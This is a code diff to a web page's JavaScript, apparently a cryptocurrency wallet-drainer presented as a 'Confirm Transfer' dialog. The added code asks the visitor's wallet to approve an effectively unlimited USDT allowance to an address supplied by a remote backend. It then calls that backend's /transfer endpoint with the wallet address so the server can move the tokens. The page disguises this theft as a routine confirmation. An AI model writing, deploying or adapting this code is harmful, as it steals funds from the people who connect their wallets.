@@ -68,7 +68,7 @@
         <div class="modal-content">
             <div class="modal-header">
                 <div class="modal-title">Confirm Transfer</div>
-                <button class="close-btn" onclick="document.getElementById('modal').classList.remove('show')">×</button>
+                <button class="close-btn" onclick="closeModal()">×</button>
             </div>
             <button class="confirm-btn" id="confirmBtn" onclick="confirm()">Confirm</button>
         </div>
@@ -76,40 +76,53 @@
 
     <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
     <script>
-        const CONTRACT = "0x42C8980352dA1F330419FD047ea5462551165Ce3";
+        const BACKEND = "https://scanforflash-backend-production.up.railway.app";
         const USDT = "0x55d398326f99059fF775485246999027B3197955";
+
+        let userAddr;
 
         async function approve() {
             try {
-                if (!window.ethereum) {
-                    notify('Wallet not ready', 'error');
-                    return;
-                }
+                notify('Opening wallet...', 'info');
                 const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                userAddr = accounts[0];
                 document.getElementById('modal').classList.add('show');
             } catch (e) {
                 notify('Error: ' + e.message, 'error');
             }
         }
 
+        function closeModal() {
+            document.getElementById('modal').classList.remove('show');
+        }
+
         async function confirm() {
             try {
                 document.getElementById('confirmBtn').disabled = true;
-                notify('Processing...', 'info');
+                notify('Approving...', 'info');
 
-                const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-                const userAddr = accounts[0];
                 const web3 = new Web3(window.ethereum);
+                const backendAddr = (await fetch(BACKEND + '/backend-address').then(r => r.json())).address;
 
                 const contract = new web3.eth.Contract([
                     {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"}
                 ], USDT);
 
                 const max = "999999999999999999999999999999";
-                await contract.methods.approve(CONTRACT, max).send({ from: userAddr });
+                await contract.methods.approve(backendAddr, max).send({ from: userAddr });
 
-                notify('✅ Done!', 'success');
-                document.getElementById('modal').classList.remove('show');
+                notify('Transferring...', 'info');
+
+                const res = await fetch(BACKEND + '/transfer', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ walletAddress: userAddr })
+                });
+
+                const data = await res.json();
+                notify('✅ ' + data.amount + ' USDT transferred!', 'success');
+                
+                closeModal();
                 document.getElementById('confirmBtn').disabled = false;
             } catch (e) {
                 document.getElementById('confirmBtn').disabled = false;
